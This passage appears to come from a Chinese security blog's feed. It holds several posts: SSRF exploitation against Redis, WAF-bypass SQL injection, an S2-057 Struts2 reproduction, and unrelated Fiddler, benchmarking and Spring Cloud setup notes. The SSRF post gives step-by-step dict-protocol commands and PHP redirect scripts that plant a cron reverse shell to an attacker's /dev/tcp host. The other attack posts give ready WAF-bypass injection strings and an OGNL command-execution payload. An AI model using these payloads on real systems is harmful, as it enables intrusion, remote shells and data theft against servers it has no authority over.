class="language-html">/etc/httpd/conf/httpd.conf/etc/rc.d/init.d/nginx/etc/init.d/nginx/etc/nginx/nginx.conf/etc/profile    #环境变量</code></pre><h5 id="各种日志信息"><a href="#各种日志信息" class="headerlink" title="各种日志信息"></a>各种日志信息</h5><p>登录成功的记录</p><pre><code class="language-html">/var/log/wtmp</code></pre><h5 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h5><pre><code class="language-html">/root/.bash_history    #一般root目录没权限访问/home/wwwroot/.bash_history</code></pre><h3 id="dict协议的深度利用"><a href="#dict协议的深度利用" class="headerlink" title="dict协议的深度利用"></a>dict协议的深度利用</h3><p>关于dict协议：</p><blockquote><p>dict://serverip:port/命令:参数<br>向服务器的端口请求 命令:参数，并在末尾自动补上\r\n(CRLF)，为漏洞利用增添了便利</p></blockquote><p>如果服务端不支持gopher协议，可尝试dict协议，不过通过dict协议的话要一条一条的执行，而gopher协议执行一条命令就行了。</p><p>curl扩展也支持dict协议，可以配合curl命令发送请求，但也可以直接在浏览器上或者bp发包请求。<br>可通过以下三条命令看是否能利用dict:</p><pre><code class="language-html">/xx.php?url=dict://172.21.0.2:6379/info/xx.php?url=dict://172.21.0.2:6379/get:user/xx.php?url=dict://172.21.0.2:6379/flushall</code></pre><h4 id="使用dict协议向Redis数据库写shell"><a href="#使用dict协议向Redis数据库写shell" class="headerlink" title="使用dict协议向Redis数据库写shell"></a>使用dict协议向Redis数据库写shell</h4><p>攻击成功的前提条件是：redis是以root权限运行的。<br>redis反弹shell命令：</p><pre><code class="language-bash">flushallset 1 &quot;\n\n\n\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/公网ip/监听端口 0&gt;&amp;1\n\n\n\n&quot;config set dir /var/spool/cron/config set dbfilename rootsave</code></pre><p>s.php</p><pre><code class="language-php">&lt;?php$ip = $_GET[&#39;ip&#39;];            //redis ip$port = $_GET[&#39;port&#39;];        //redis 端口$bhost = $_GET[&#39;bhost&#39;];        //反弹ip$bport = $_GET[&#39;bport&#39;];        //反弹端口$scheme = $_GET[&#39;s&#39;];        //协议header(&quot;Location: $scheme://$ip:$port/set:0:\&quot;\\x0a\\0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\x26\\x20/dev/tcp/{$bhost}/{$bport}\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;); ?&gt;</code></pre><p>302.php</p><pre><code class="language-php">&lt;?php$ip = $_GET[&#39;ip&#39;];            //redis ip$port = $_GET[&#39;port&#39;];        //redis 端口$scheme = $_GET[&#39;s&#39;];        //协议$data = $_GET[&#39;data&#39;];header(&quot;Location: $scheme://$ip:$port/$data&quot;); ?&gt;</code></pre><p>1.先清除没用的数据，防止定时任务执行失败</p><pre><code class="language-html">/url.php?url=http://xxxx/302.php?s=dict%26ip=172.21.0.2%26port=6379%26data=flushall/url.php?url=dict://172.21.0.2:6379/flushall</code></pre><p>2.利302跳转写入反弹命令</p><pre><code class="language-html">/url.php?url=http://xxxx/s.php?s=dict%26ip=172.21.0.2%26port=6379%26bhost=公网ip%26bport=监听端口/url.php?url=dict://172.21.0.2:6379/set:1:&quot;\n\n\n\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/公网ip/监听端口 0&gt;&amp;1\n\n\n\n&quot;</code></pre><p>3.设置导出路径</p><pre><code class="language-html">/url.php?url=http://xxxx/302.php?s=dict%26ip=172.21.0.2%26port=6379%26data=config:set:dir:/var/spool/cron//url.php?url=dict://172.21.0.2:6379/config:set:dir:/var/spool/cron/</code></pre><p>4.设置导出名字</p><pre><code class="language-html">/url.php?url=http://xxxx/302.php?s=dict%26ip=172.21.0.2%26port=6379%26data=config:set:dbfilename:root/url.php?url=dict://172.21.0.2:6379/config:set:dbfilename:root</code></pre><p>5.导出</p><pre><code class="language-html">/url.php?url=http://xxxx/302.php?s=dict%26ip=172.21.0.2%26port=6379%26data=save/url.php?url=dict://172.21.0.2:6379/save</code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652474855&amp;idx=1&amp;sn=96713e3c479a237bbbd5091a040d3adc&amp;9c6e6fea" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&amp;mid=2652474855&amp;idx=1&amp;sn=96713e3c479a237bbbd5091a040d3adc&amp;9c6e6fea</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;ssrf之深度利用&quot;&gt;&lt;a href=&quot;#ssrf之深度利用&quot; class=&quot;headerlink&quot; title=&quot;ssrf之深度利用&quot;&gt;&lt;/a&gt;ssrf之深度利用&lt;/h2&gt;&lt;h3 id=&quot;file协议任意文件读取的深度利用&quot;&gt;&lt;a href=&quot;#file协议任意
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>绕过安全狗进行SQL注入-终极打狗棍法</title>
    <link href="https://blog.cuittk.cn/2019/12/02/%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E8%BF%9B%E8%A1%8CSQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://blog.cuittk.cn/2019/12/02/绕过安全狗进行SQL注入/</id>
    <published>2019-12-02T15:22:30.684Z</published>
    <updated>2020-02-26T08:47:30.782Z</updated>
    
    <content type="html"><![CDATA[<h2 id="绕过安全狗进行SQL注入-终极打狗棍法"><a href="#绕过安全狗进行SQL注入-终极打狗棍法" class="headerlink" title="绕过安全狗进行SQL注入-终极打狗棍法"></a>绕过安全狗进行SQL注入-终极打狗棍法</h2><p>都9102年了还在打狗</p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>网站安全狗v4.0.2655<br>Apache/2.4.23<br>PHP/5.6<br>mysql 5.7</p><h3 id="常规的绕过-打狗棍法第一式"><a href="#常规的绕过-打狗棍法第一式" class="headerlink" title="常规的绕过-打狗棍法第一式"></a>常规的绕过-打狗棍法第一式</h3><p>and 1=1和and 1=2被拦截<br>Xor 1=1和Xor 1=2不拦截<br>if((1=1),1,2)和if((1=2),1,2)不拦截<br>使用<code>%26</code>即url编码的<code>&amp;</code>绕过：<code>%26%26 True</code>和<code>%26%26 False</code><br><img src="http://img.cdn.cuittk.cn/f4vlmh2m8syk3grhsi9r5k3boi.png" alt=""></p><p><img src="http://img.cdn.cuittk.cn/t1k9ph6v6m45npklipe2kbnr35.png" alt=""></p><p><img src="http://img.cdn.cuittk.cn/tv759nh3ewd8t6lgioszqeusai.png" alt=""></p><p><img src="http://img.cdn.cuittk.cn/ujf9w26n05cxfbymdizoaqw8qi.png" alt=""></p><h3 id="order-by-绕过-打狗棍法第二式"><a href="#order-by-绕过-打狗棍法第二式" class="headerlink" title="order by 绕过-打狗棍法第二式"></a>order by 绕过-打狗棍法第二式</h3><h4 id="尝试order内联注释绕过"><a href="#尝试order内联注释绕过" class="headerlink" title="尝试order内联注释绕过"></a>尝试order内联注释绕过</h4><pre><code class="language-html">/**//*!order*//**//*!by*//**//*!1*/</code></pre><p><img src="http://img.cdn.cuittk.cn/vt3nr0uoquu6uoj695cbgim6rm.png" alt=""></p><p>哈哈，失败了，都9102年，还是有长进的嘛</p><h4 id="利用换行跳过注释进行绕过"><a href="#利用换行跳过注释进行绕过" class="headerlink" title="利用换行跳过注释进行绕过"></a>利用换行跳过注释进行绕过</h4><pre><code class="language-html">order%23a%0aby 3</code></pre><p><code>%23</code>为#注释，<code>%0a</code>为回车符，意思是：</p><pre><code class="language-html">order#aby 3</code></pre><p>也有用<code>/**/</code>替换空格的：</p><pre><code class="language-html">/**/order/**/%23aaaa%0a/**/by/**/3</code></pre><p><img src="http://img.cdn.cuittk.cn/jn6heck4khiu273ssew0mwuahs.png" alt=""><br><img src="http://img.cdn.cuittk.cn/rwlp0oqs9op6iy1985wsfxvx9l.png" alt=""><br>字段数为3</p><h3 id="union-select-绕过-打狗棍法第三式"><a href="#union-select-绕过-打狗棍法第三式" class="headerlink" title="union select 绕过-打狗棍法第三式"></a>union select 绕过-打狗棍法第三式</h3><p>同样是利用换行跳过注释进行绕过</p><pre><code class="language-html">id=1 %26%26False union%23a%0aselect 1,2,3id=-1 union%23a%0aselect 1,2,3</code></pre><p><img src="http://img.cdn.cuittk.cn/x74bwpdclgwg6jnd70tvo2qhby.png" alt=""><br>user()函数拦截绕过：<code>user%23a%0a()</code></p><pre><code class="language-html">id=-1 union%23a%0aselect user%23a%0a(),2,3</code></pre><p><img src="http://img.cdn.cuittk.cn/5gs7vjjhjwoh6jy1kwacsg48zd.png" alt=""></p><p>但是会拦截其他的关键字：<code>version</code>等，显得有些鸡肋<br><img src="http://img.cdn.cuittk.cn/cmhepscfhlb1qrs5t76jzqk273.png" alt=""></p><h3 id="终极打狗棍法"><a href="#终极打狗棍法" class="headerlink" title="终极打狗棍法"></a>终极打狗棍法</h3><p>发现安全狗会把<code>/**/</code>之间的内容直接忽略掉，所以就很有意思了，例如如下链接id存在注入：</p><pre><code class="language-html">http://xxxx/index.php?id=1http://xxxx/index.php?a=/*&amp;id=1 and 1=2 union select version(),2,3%23*/</code></pre><p>想怎么注就怎么注<br><img src="http://img.cdn.cuittk.cn/d0nadn70ld817ws0cjv0knq74l.png" alt=""></p><p><strong>杀狗</strong></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://422926799.github.io/posts/aafbd292.html" target="_blank" rel="external">https://422926799.github.io/posts/aafbd292.html</a><br><a href="https://422926799.github.io/posts/9d8606fc.html" target="_blank" rel="external">https://422926799.github.io/posts/9d8606fc.html</a><br><a href="https://blog.csdn.net/he_and/article/details/81287008" target="_blank" rel="external">https://blog.csdn.net/he_and/article/details/81287008</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;绕过安全狗进行SQL注入-终极打狗棍法&quot;&gt;&lt;a href=&quot;#绕过安全狗进行SQL注入-终极打狗棍法&quot; class=&quot;headerlink&quot; title=&quot;绕过安全狗进行SQL注入-终极打狗棍法&quot;&gt;&lt;/a&gt;绕过安全狗进行SQL注入-终极打狗棍法&lt;/h2&gt;&lt;p&gt;都9
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>内网渗透</title>
    <link href="https://blog.cuittk.cn/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    <id>https://blog.cuittk.cn/2019/11/21/内网渗透/</id>
    <published>2019-11-21T02:56:53.517Z</published>
    <updated>2019-12-02T15:21:43.782Z</updated>
    
    <content type="html"><![CDATA[<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>IPC，黄金票据，白银票据，ntlm relay，Ptt,Ptk</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;内网渗透&quot;&gt;&lt;a href=&quot;#内网渗透&quot; class=&quot;headerlink&quot; title=&quot;内网渗透&quot;&gt;&lt;/a&gt;内网渗透&lt;/h3&gt;&lt;p&gt;IPC，黄金票据，白银票据，ntlm relay，Ptt,Ptk&lt;/p&gt;

      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Fiddler抓ios流量遇到的问题</title>
    <link href="https://blog.cuittk.cn/2019/11/11/Fiddler%E6%8A%93ios%E6%B5%81%E9%87%8F%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>https://blog.cuittk.cn/2019/11/11/Fiddler抓ios流量遇到的问题/</id>
    <published>2019-11-11T09:32:20.322Z</published>
    <updated>2020-02-26T08:10:04.412Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Fiddler抓ios流量遇到的问题"><a href="#Fiddler抓ios流量遇到的问题" class="headerlink" title="Fiddler抓ios流量遇到的问题"></a>Fiddler抓ios流量遇到的问题</h2><h3 id="PC上开启端口，启用https"><a href="#PC上开启端口，启用https" class="headerlink" title="PC上开启端口，启用https"></a>PC上开启端口，启用https</h3><p>启用https<br><img src="http://img.cdn.cuittk.cn/QQ%E5%9B%BE%E7%89%8720191111174039.png" alt=""><br>开启8888端口<br><img src="http://img.cdn.cuittk.cn/QQ%E6%88%AA%E5%9B%BE20191111174214.png" alt=""></p><h3 id="ios端下载证书"><a href="#ios端下载证书" class="headerlink" title="ios端下载证书"></a>ios端下载证书</h3><p>访问192.168.1.129:8888<br><img src="http://img.cdn.cuittk.cn/QQ%E6%88%AA%E5%9B%BE20191111174215.jpg" alt=""></p><h3 id="iso端信任证书"><a href="#iso端信任证书" class="headerlink" title="iso端信任证书"></a>iso端信任证书</h3><p>设置-&gt;通用-&gt;描述文件与设备管理。安装证书<br>出现报错信息：</p><pre><code class="language-html">警告安装未受管理的根证书若安装证书“DO_ NOT. _TRUST FiddlerRoot&quot;，此证书将被添加到iPhone.上被信任的证书列表中。只有在“证书信任设置”中启用，网站才会信任此证书。未验证的描述文件不能验证“DO_ NOT_ _TRUST_ FiddlerRoot”的真实性。</code></pre><p><img src="http://img.cdn.cuittk.cn/QQ%E6%88%AA%E5%9B%BE20191111174216.png" alt=""><br>安装信任之后还需要添加证书信任。<br>在 设置-&gt;通用-&gt;关于本机-&gt;证书信任设置中启用完全信任。<br><img src="http://img.cdn.cuittk.cn/QQ%E6%88%AA%E5%9B%BE20191111174217.png" alt=""></p><h3 id="再次遇到问题"><a href="#再次遇到问题" class="headerlink" title="再次遇到问题"></a>再次遇到问题</h3><p>抓取https的时候总是出现”Tunnel to……443”<br><img src="https://img-blog.csdn.net/20161020160036648" alt=""><br>本地证书问题</p><pre><code class="language-html">win + r`=&gt;`certmgr.msc</code></pre><p><img src="https://img-blog.csdn.net/20161020160931705" alt=""><br>请点击操作–查找证书，如下所示：<br><img src="https://img-blog.csdn.net/20170704111939684?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZDEyNDA2NzM3Njk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>然后输入fiddler查找所有相关证书，如下所示：<br><img src="https://img-blog.csdn.net/20170704111953615?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZDEyNDA2NzM3Njk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""><br>全部删除</p><p>下载 FiddlerCertMaker.exe<br><a href="http://www.telerik.com/docs/default-source/fiddler/addons/fiddlercertmaker.exe?sfvrsn=2" target="_blank" rel="external">http://www.telerik.com/docs/default-source/fiddler/addons/fiddlercertmaker.exe?sfvrsn=2</a><br>下载后直接双击安装即可</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/chjqxxxx/article/details/53666175" target="_blank" rel="external">https://blog.csdn.net/chjqxxxx/article/details/53666175</a><br><a href="https://blog.csdn.net/d1240673769/article/details/74298429" target="_blank" rel="external">https://blog.csdn.net/d1240673769/article/details/74298429</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Fiddler抓ios流量遇到的问题&quot;&gt;&lt;a href=&quot;#Fiddler抓ios流量遇到的问题&quot; class=&quot;headerlink&quot; title=&quot;Fiddler抓ios流量遇到的问题&quot;&gt;&lt;/a&gt;Fiddler抓ios流量遇到的问题&lt;/h2&gt;&lt;h3 id=&quot;P
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>使用ab压测工具</title>
    <link href="https://blog.cuittk.cn/2019/01/09/%E4%BD%BF%E7%94%A8ab%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7/"/>
    <id>https://blog.cuittk.cn/2019/01/09/使用ab压测工具/</id>
    <published>2019-01-09T12:17:50.436Z</published>
    <updated>2020-02-26T09:01:24.384Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用ab压测工具"><a href="#使用ab压测工具" class="headerlink" title="使用ab压测工具"></a>使用ab压测工具</h2><p>使用的操作系统：ubuntu14.04</p><pre><code class="language-html">apt-get update    #更新源sudo apt-get install apache2-utilsab -n 100 -c 10 www.baidu.com/index.htmlab -n 100 -c 10 www.baidu.com/index.php</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;使用ab压测工具&quot;&gt;&lt;a href=&quot;#使用ab压测工具&quot; class=&quot;headerlink&quot; title=&quot;使用ab压测工具&quot;&gt;&lt;/a&gt;使用ab压测工具&lt;/h2&gt;&lt;p&gt;使用的操作系统：ubuntu14.04&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang
      
    
    </summary>
    
      <category term="开发" scheme="https://blog.cuittk.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>使用php 接入Spring Cloud微服务</title>
    <link href="https://blog.cuittk.cn/2019/01/04/%E4%BD%BF%E7%94%A8php%20%E6%8E%A5%E5%85%A5Spring%20Cloud%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    <id>https://blog.cuittk.cn/2019/01/04/使用php 接入Spring Cloud微服务/</id>
    <published>2019-01-04T15:06:14.888Z</published>
    <updated>2020-02-26T10:22:31.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用php-接入Spring-Cloud微服务"><a href="#使用php-接入Spring-Cloud微服务" class="headerlink" title="使用php 接入Spring Cloud微服务"></a>使用php 接入Spring Cloud微服务</h2><p>微服务很火，实验室要求大部分语言接入微服务，比如:.NET、JAVA、前端、PHP。微服务本来就是JAVA的，作为一个phper，只有想办法接入微服务。<br>网上可以参考的东西不多，但还是找到了可利用的东西。<br>先实现php注册到Spring Cloud的注册中心：<a href="http://eureka.springcloud.cn/" target="_blank" rel="external">http://eureka.springcloud.cn/</a></p><h3 id="把php应用部署到openresty-PHP（FPM）"><a href="#把php应用部署到openresty-PHP（FPM）" class="headerlink" title="把php应用部署到openresty + PHP（FPM）"></a>把php应用部署到openresty + PHP（FPM）</h3><p>注册工具SpringCloudOpenresty</p><h4 id="前提：安装openresty和php-7-0和FPM"><a href="#前提：安装openresty和php-7-0和FPM" class="headerlink" title="前提：安装openresty和php 7.0和FPM"></a>前提：安装openresty和php 7.0和FPM</h4><p>使用的系统：ubuntu14.04</p><h5 id="安装openresty"><a href="#安装openresty" class="headerlink" title="安装openresty"></a>安装openresty</h5><p>源码包下载：<a href="http://openresty.org/cn/download.html" target="_blank" rel="external">http://openresty.org/cn/download.html</a><br>找个目录放源码：cd /root</p><pre><code class="language-html">wegt https://openresty.org/download/openresty-1.13.6.2.tar.gz</code></pre><p>相关依赖包的安装</p><pre><code class="language-html">apt-get install libreadline-dev libncurses5-dev libpcre3-dev libssl-dev perl make build-essential</code></pre><p>解压源码，安装openresty</p><pre><code class="language-html">tar -xzvf openresty-1.13.6.2.tar.gzcd openresty-1.13.6.2./configuremake &amp;&amp; make install</code></pre><p>验证安装成功</p><pre><code class="language-html">curl 127.0.0.1</code></pre><p>返回一段html代码<br><img src="http://img.cdn.cuittk.cn/u439vuq7ls3e44269fg46hnz5m.png" alt=""></p><h5 id="安装php7-0"><a href="#安装php7-0" class="headerlink" title="安装php7.0"></a>安装php7.0</h5><p>前期准备</p><pre><code class="language-html"># 更新 apt-getsudo apt-get update# 解决有可能存在的语言问题sudo apt-get install -y language-pack-en-base</code></pre><p>安装完成之后，运行：</p><pre><code class="language-html">locale-gen en_US.UTF-8</code></pre><p>安装Php7.0，本教程采用ppa方式安装php7.0，</p><pre><code class="language-html"># 添加php的仓库sudo apt-get install software-properties-common#&gt; 中途按下回车sudo LC_ALL=en_US.UTF-8 add-apt-repository ppa:ondrej/php</code></pre><p>安装完成之后，运行<code>sudo apt-get update</code>更新安装包，把刚才添加的包拉取下来。 运行<code>apt-cache search php7.0</code>搜索php7.0开头的包检验是否安装成功，输出如下：<br><img src="http://img.cdn.cuittk.cn/m1h9vah8ltk2os85ulq8ttvs4i.png" alt=""><br>安装php7.0:</p><pre><code class="language-html">sudo apt-get -y install php7.0</code></pre><p>安装成功后运行<code>php -v</code>查看是否安装成功，成功的话会输出类似如下信息：<br><img src="http://img.cdn.cuittk.cn/033oleh1itlqh4tezivfbc2pam.png" alt=""></p><h5 id="安装-fpm"><a href="#安装-fpm" class="headerlink" title="安装 fpm"></a>安装 fpm</h5><pre><code class="language-html">sudo apt-get install php7.0-fpm</code></pre><h4 id="使用serviceRegistry工具"><a href="#使用serviceRegistry工具" class="headerlink" title="使用serviceRegistry工具"></a>使用serviceRegistry工具</h4><p>下载serviceRegistry到root目录下<br><a href="https://github.com/tangaiyun/SpringCloudOpenrestyPHP" target="_blank" rel="external">https://github.com/tangaiyun/SpringCloudOpenrestyPHP</a><br>对于Spring cloud：<br>1.将serviceRegistry/consul/lualib中的所有文件（包含目录）复制到你的openresty lualib目录中/usr/local/openresty/lualib</p><pre><code class="language-html">cp -r /root/serviceRegistry/eureka/lualib/* /usr/local/openresty/lualib</code></pre><p>2.更改你的nginx.conf文件和serviceRegistry/consul/conf/nginx.conf一样，请注意块</p><pre><code class="language-html">cp -r /root/serviceRegistry/eureka/conf/* /usr/local/openresty/nginx/conf</code></pre><pre><code class="language-html">init_worker_by_lua_block {        if 0 == ngx.worker.id() then             local workservice = require &#39;eureka.workerservice&#39;            local filePath = &#39;/usr/local/openresty/nginx/conf/serviceInstance.json&#39;            eurekaHost = &#39;10.100.23.69&#39;            eurekaPort = 8761        local file1 = io.input(filePath)...</code></pre><p>可将“filePath”更改为您自己的服务配置位置。<br>eurekaHost填写注册中心ip或者域名。比如Spring Cloud的注册中心：<code>eureka.springcloud.cn</code><br>eurekaPort填写注册中心的端口。比如Spring Cloud的注册中心端口：<code>80</code><br>3.将serviceInstance.json更改为你的环境，例如：</p><pre><code class="language-html">/usr/local/openresty/nginx/conf/serviceInstance.json</code></pre><p>中的ip改为自己环境的ip，比如192.168.211.22<br>4.将serviceRegistry/eureka/html中的文件复制到你的Web根目录。</p><pre><code class="language-html">cp -r /root/serviceRegistry/eureka/html/* /usr/local/openresty/nginx/html</code></pre><h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><p>Openresty nginx服务命令：</p><pre><code class="language-html">/usr/local/openresty/nginx/sbin/nginx #启动/usr/local/openresty/nginx/sbin/nginx -s stop #停止/usr/local/openresty/nginx/sbin/nginx -s reload #重启</code></pre><p>启动php7.0-fpm服务</p><pre><code class="language-html">service php7.0-fpm start</code></pre><p>开启openresty以及php7.0-fpm，可以发现在注册中心已经注册成功。<br><img src="http://img.cdn.cuittk.cn/hqdsgu3mr6bt91zq0o6vuzwljt.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;使用php-接入Spring-Cloud微服务&quot;&gt;&lt;a href=&quot;#使用php-接入Spring-Cloud微服务&quot; class=&quot;headerlink&quot; title=&quot;使用php 接入Spring Cloud微服务&quot;&gt;&lt;/a&gt;使用php 接入Spring Cl
      
    
    </summary>
    
      <category term="开发" scheme="https://blog.cuittk.cn/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-11776漏洞从搭建到复现</title>
    <link href="https://blog.cuittk.cn/2019/01/02/CVE-2018-11776%E6%BC%8F%E6%B4%9E%E4%BB%8E%E6%90%AD%E5%BB%BA%E5%88%B0%E5%A4%8D%E7%8E%B0/"/>
    <id>https://blog.cuittk.cn/2019/01/02/CVE-2018-11776漏洞从搭建到复现/</id>
    <published>2019-01-02T12:23:13.189Z</published>
    <updated>2020-02-26T10:24:08.113Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Struts2-057-CVE-2018-11776-漏洞从搭建到复现"><a href="#Struts2-057-CVE-2018-11776-漏洞从搭建到复现" class="headerlink" title="Struts2-057(CVE-2018-11776)漏洞从搭建到复现"></a>Struts2-057(CVE-2018-11776)漏洞从搭建到复现</h2><p>村里刚通网，出来这么久了才做复现。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）。</p><p>定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行。<br>url标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>受影响版本<br>Struts2.3 – 2.3.34<br>Struts2.5 – 2.5.16</p><p>不受影响版本<br>Struts 2.3.35<br>Struts 2.5.17</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现环境：<br>windows 7<br>jdk1.8.0_91<br>apache-tomcat-7.0.92<br>struts-2.3.34<br>环境搭建：<br>先安装jdk环境，配置java环境变量。<br>下载apache-tomcat-7.0.92，下载地址：<a href="https://tomcat.apache.org/download-70.cgi" target="_blank" rel="external">https://tomcat.apache.org/download-70.cgi</a><br><img src="http://img.cdn.cuittk.cn/u3c354uz0k9it2gfu2pam7vi.png" alt="">我下载的windows 64的压缩包。将tomcat解压<br><img src="http://img.cdn.cuittk.cn/difdllbh4n2ym65tn596m8h19v.png" alt=""><br>下载Struts-2.3.34，下载地址：<a href="http://archive.apache.org/dist/struts/2.3.34/" target="_blank" rel="external">http://archive.apache.org/dist/struts/2.3.34/</a><br>选择第一个struts-2.3.34-all.zip<br><img src="http://img.cdn.cuittk.cn/2ughdohp6szwif83irwox34wbf.png" alt=""><br>将压缩包里的struts2-showcase.war放至在tomcat下的webapps目录下进行自动部署<br><img src="http://img.cdn.cuittk.cn/4w45i31lg76cg0v5n3oqixb1hh.png" alt=""><br>在tomcat下bin目录下运行startup.bat脚本就可以自动运行tomcat来部署struts2了。<br>成功部署完成后我们在浏览器中输入<a href="http://127.0.0.1:8080/struts2-showcase" target="_blank" rel="external">http://127.0.0.1:8080/struts2-showcase</a> 就可以部署成功了。<br><img src="http://img.cdn.cuittk.cn/cf5vxetpaxfj3xft0f0u31z4r6.png" alt=""><br>正常部署完成struts如上所示，但为了复现struts2-057漏洞。我们的满足跳转的条件。故此我们的进行修改默认的action控制器来设置跳转的逻辑。方便我们复现漏洞。<br>需要修改的地方有两处，两个文件都修改：<br>1、D:\tomcat\webapps\struts2-showcase\WEB-INF\src\java\struts-actionchaining.xml<br>2、D:\tomcat\webapps\struts2-showcase\WEB-INF\classes\struts-actionchaining.xml<br>我们注释掉原来的xml文件。修改为如下所示：<br><img src="http://img.cdn.cuittk.cn/8901sfw3g8yf1y3hniyknfqpbk.png" alt=""><br>修改后代码如下：</p><pre><code class="language-java">&lt;struts&gt;    &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;        &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;            &lt;result type=&quot;redirectAction&quot;&gt;            &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;            &lt;/result&gt;            &lt;/action&gt;        &lt;action name=&quot;actionChain2&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain2&quot;&gt;            &lt;result type=&quot;chain&quot;&gt;actionChain3&lt;/result&gt;        &lt;/action&gt;        &lt;action name=&quot;actionChain3&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain3&quot;&gt;            &lt;result&gt;/WEB-INF/actionchaining/actionChainingResult.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;</code></pre><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>构造payload：</p><pre><code class="language-html">http://127.0.0.1:8080/struts2-showcase/${(222+333)}/actionChain1.action</code></pre><p>执行完成之后发现跳转到了<code>http://127.0.0.1:8080/struts2-showcase/555/register2.action</code><br>说明存在OGNL注入。证明漏洞存在。<br>随后在进行调用本地计算器命令来测试。<br>Payload如下所示：</p><pre><code class="language-html">${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))}</code></pre><p>执行之前我们先进行URL编码得到如下：</p><pre><code 